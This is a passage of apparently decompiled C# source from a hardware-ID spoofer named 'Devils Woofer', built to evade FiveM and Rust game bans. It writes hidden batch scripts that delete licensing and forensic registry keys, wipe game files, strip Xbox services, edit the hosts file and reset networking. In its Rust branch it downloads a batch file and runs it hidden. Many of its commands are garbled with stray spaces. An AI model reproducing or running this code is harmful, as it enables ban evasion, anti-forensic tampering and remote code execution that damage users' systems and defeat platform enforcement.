						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\botan.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("taskkill / f / im Steam.exe / t");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc STARCHARMS_SPOOFER");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\mods\\*.* ");
						streamWriter.WriteLine(":folderclean");
						streamWriter.WriteLine("call :getDiscordVersion");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("goto :xboxclean");
						streamWriter.WriteLine(": getDiscordVersion");
						streamWriter.WriteLine("for / d %% a in (' % appdata%\\Discord\\*') do (");
						streamWriter.WriteLine("     set 'varLoc =%%a'");
						streamWriter.WriteLine("   goto :d1");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine(":d1");
						streamWriter.WriteLine("for / f 'delims =\\ tokens=7' %% z in ('echo %varLoc%') do (");
						streamWriter.WriteLine("     set 'discordVersion =%%z'");
						streamWriter.WriteLine(")");
						streamWriter.WriteLine("goto :EOF");
						streamWriter.WriteLine(": xboxclean");
						streamWriter.WriteLine(" cls");
						streamWriter.WriteLine("powershell - Command ' & {Get-AppxPackage -AllUsers xbox | Remove-AppxPackage}'");
						streamWriter.WriteLine("sc stop XblAuthManager");
						streamWriter.WriteLine("sc stop XblGameSave");
						streamWriter.WriteLine("sc stop XboxNetApiSvc");
						streamWriter.WriteLine("sc stop XboxGipSvc");
						streamWriter.WriteLine("sc delete XblAuthManager");
						streamWriter.WriteLine("sc delete XblGameSave");
						streamWriter.WriteLine("sc delete XboxNetApiSvc");
						streamWriter.WriteLine("sc delete XboxGipSvc");
						streamWriter.WriteLine("reg delete 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\xbgm' / f");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTask' / disable");
						streamWriter.WriteLine("schtasks / Change / TN 'Microsoft\\XblGameSave\\XblGameSaveTaskLogon' / disableL");
						streamWriter.WriteLine("reg add 'HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\GameDVR' / v AllowGameDVR / t REG_DWORD / d 0 / f");
						streamWriter.WriteLine("cls");
						streamWriter.WriteLine("set hostspath =% windir %\\System32\\drivers\\etc\\hosts");
						streamWriter.WriteLine("   echo 127.0.0.1 xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   echo 127.0.0.1 user.auth.xboxlive.com >> % hostspath % ");
						streamWriter.WriteLine("   echo 127.0.0.1 presence - heartbeat.xboxlive.com >> % hostspath %");
						streamWriter.WriteLine("   rd % userprofile %\\AppData\\Local\\DigitalEntitlements / q / s");
						streamWriter.WriteLine("exit");
						streamWriter.WriteLine("goto :eof");
					}
					Process process = Process.Start(text);
					process.WaitForExit();
					File.Delete(text);
					string path = "C:\\Program Files\\Win64";
					bool flag4 = !Directory.Exists(path);
					if (flag4)
					{
						Directory.CreateDirectory(path);
					}
					bool flag5 = File.Exists("C:\\Program Files\\Win64\\net.bat");
					if (flag5)
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text2 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter2 = File.CreateText(text2))
						{
							streamWriter2.WriteLine("netsh int ip reset");
						}
						Process process2 = new Process();
						process2.StartInfo.FileName = text2;
						this.processlist.Add(process2);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process2.Start();
					}
					string text3 = Path.ChangeExtension(Path.GetTempFileName(), ".bat");
					using (StreamWriter streamWriter3 = new StreamWriter(text3))
					{
						streamWriter3.WriteLine("echo off");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("taskkill /f /im Steam.exe /t");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("set hostspath=%windir%\\System32\\drivers\\etc\\hosts");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\HardwareID / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\MSLicensing\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / va / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETEH KEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\WinRAR\\ArcHistory / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\ShowJumpView / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 332004695 - 2829936588 - 140372829 - 1002 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CLASSES_ROOT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Services\\bam\\State\\UserSettings\\S - 1 - 5 - 21 - 1282084573 - 1681065996 - 3115981261 - 1001 / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched / f");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\Browser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\db");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\dunno");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\priv");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\servers");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\subprocess");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\unconfirmed");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\steam_api64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\FiveM\\FiveM.app\\cache\\authbrowser");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\crashometry");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cache\\launcher_skip_mtl2");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q %LocalAppData%\\DigitalEntitlements");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\profiles.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_chrome.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_372.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1604.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_1868.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2060.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX_SubProcess_game_2189.bin");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\logs\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenGame.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\cfx_curl_x86_64.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\steam.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("rmdir / s / q % userprofile %\\AppData\\Roaming\\CitizenFX");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\asi - five.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\CitizenFX.ini");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\caches.XML");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\adhesive.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f % LocalAppData %\\FiveM\\FiveM.app\\discord.dll");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("del / s / q / f %LocalAppData%\\FiveM\\FiveM.app\\crashes\\*.* ");
						streamWriter3.WriteLine("cls");
						streamWriter3.WriteLine("RENAME % userprofile %\\AppData\\Roaming\\discord\\0.0.309\\modules\\discord_rpc LeanV2");
						streamWriter3.WriteLine("cls");
					}
					Process process3 = Process.Start(text3);
					process3.WaitForExit();
					File.Delete(text3);
					Main.HWIDclick();
					Main.XBOXclick();
					Main.PCclick();
					Main.Diskclick();
					Main.FiveM();
					Main.New();
					string path2 = "C:\\Program Files\\Win64";
					bool flag6 = !Directory.Exists(path2);
					if (flag6)
					{
						Directory.CreateDirectory(path2);
					}
					bool flag7 = File.Exists("C:\\Program Files\\Win64\\net.bat");
					if (flag7)
					{
						Process.Start("C:\\Program Files\\Win64\\net.bat");
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					else
					{
						string text4 = "C:\\Program Files\\Win64\\net.bat";
						using (StreamWriter streamWriter4 = File.CreateText(text4))
						{
							streamWriter4.WriteLine("netsh int ip reset");
						}
						Process process4 = new Process();
						process4.StartInfo.FileName = text4;
						this.processlist.Add(process4);
						File.SetAttributes("C:\\Program Files\\Win64\\net.bat", FileAttributes.Hidden);
						process4.Start();
						Thread.Sleep(500);
						File.Delete("C:\\Program Files\\Win64\\net.bat");
					}
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
					bool flag8 = Directory.Exists(folderPath + "\\DigitalEntitlements");
					if (flag8)
					{
						Directory.Delete(folderPath + "\\DigitalEntitlements", true);
					}
					bool flag9 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\crashes");
					if (flag9)
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\crashes", true);
					}
					bool flag10 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\logs");
					if (flag10)
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\logs", true);
					}
					bool flag11 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\cache");
					if (flag11)
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\data\\cache", true);
					}
					bool flag12 = Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\citizen");
					if (flag12)
					{
						Directory.Delete(folderPath + "\\FiveM\\FiveM.app\\citizen", true);
					}
					Directory.Exists(folderPath + "\\FiveM\\FiveM.app\\data\\server-cache");
					bool flag13 = Directory.Exists(folderPath2 + "\\CitizenFX");
					if (flag13)
					{
						Directory.Delete(folderPath2 + "\\CitizenFX", true);
					}
					string path3 = "C:\\Program Files\\Win64";
					bool flag14 = !Directory.Exists(path3);
					if (flag14)
					{
						Directory.CreateDirectory(path3);
					}
					bool flag15 = File.Exists("C:\\Program Files\\Sounds\\fivemspoofed.wav");
					if (flag15)
					{
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					else
					{
						string address = "https://cdn.discordapp.com/attachments/953684464104513571/959156445411180574/fivemspoofed.wav";
						string fileName = "C:\\Program Files\\Sounds\\fivemspoofed.wav";
						WebClient webClient = new WebClient();
						webClient.DownloadFile(address, fileName);
						File.SetAttributes("C:\\Program Files\\Sounds\\fivemspoofed.wav", FileAttributes.Hidden);
						new SoundPlayer("C:\\Program Files\\Sounds\\fivemspoofed.wav").Play();
					}
					MessageBox.Show("FiveM Spoofed!", "Devils Woofer", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					bool flag16 = this.MethodCB.Text == "FiveM Bypass";
					if (flag16)
					{
						base.Hide();
						Process[] processesByName = Process.GetProcessesByName("FiveM");
						bool flag17 = processesByName.Length == 0;
						if (!flag17)
						{
							foreach (Process process5 in Process.GetProcessesByName("FiveM"))
							{
								process5.Kill();
							}
						}
						bool flag18 = Directory.Exists("C:\\Program Files (x86)\\Blade Group");
						if (flag18)
						{
							Directory.Delete("C:\\Program Files (x86)\\Blade Group");
							Directory.CreateDirectory("C:\\Program Files (x86)\\Blade Group");
						}
						string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
						string folderPath4 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
						new Process
						{
							StartInfo = new ProcessStartInfo
							{
								WindowStyle = ProcessWindowStyle.Hidden,
								FileName = "cmd.exe",
								Arguments = "/C Start Explorer.exe fivem://connect/" + this.enterip.Text
							}
						}.Start();
						new Process
						{
							StartInfo = 
							{
								FileName = "cmd.exe",
								CreateNoWindow = true,
								RedirectStandardInput = true,
								RedirectStandardOutput = true,
								UseShellExecute = false,
								Verb = "runas",
								Arguments = "/C netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2372Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\fivem_b2372_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2372Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMSteamBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_SteamChild.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMSteamBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveMRockstarBlock\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveMRockstarBlock\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2189Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\\FiveM_b2189_GTAProcess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2189Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2060Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2060_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2060Block\" dir =out new enable= yes > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =in action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall add rule name = \"FiveM2545Block\" dir =out action = block profile = any program = \"%LocalAppData%\\FiveM\\FiveM.app\\data\\cache\\subprocess\fivem_b2545_gtaprocess.exe\" > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =in new enable= yes > nul && netsh advfirewall firewall set rule name = \"FiveM2545Block\" dir =out new enable= yes > nul"
							}
						}.Start();
						base.Hide();
						System.Timers.Timer timer = new System.Timers.Timer(50.0);
						timer.AutoReset = true;
						timer.Elapsed += Main.MyMethod2;
						timer.Start();
					}
					else
					{
						bool flag19 = this.MethodCB.Text == "Rust";
						if (flag19)
						{
							string tempPath = Path.GetTempPath();
							byte[] bytes = Login.KeyAuthApp.download("203677");
							File.WriteAllBytes(tempPath + this.xynw + ".bat", bytes);
							File.SetAttributes(tempPath + this.xynw + ".bat", FileAttributes.Hidden);
							Process.Start(tempPath + this.xynw + ".bat");
							Thread.Sleep(2500);
							this.xynwbyzia();
							Class1 class2 = new Class1();
							class2.spoofUserMode();
							Main.HWIDclick();
							string value = string.Concat(new string[]
							{
								Main.GenerateString(5),
								"-",
								Main.GenerateString(5),
								"-",
								Main.GenerateString(5),
								"-",
								Main.GenerateString(5)
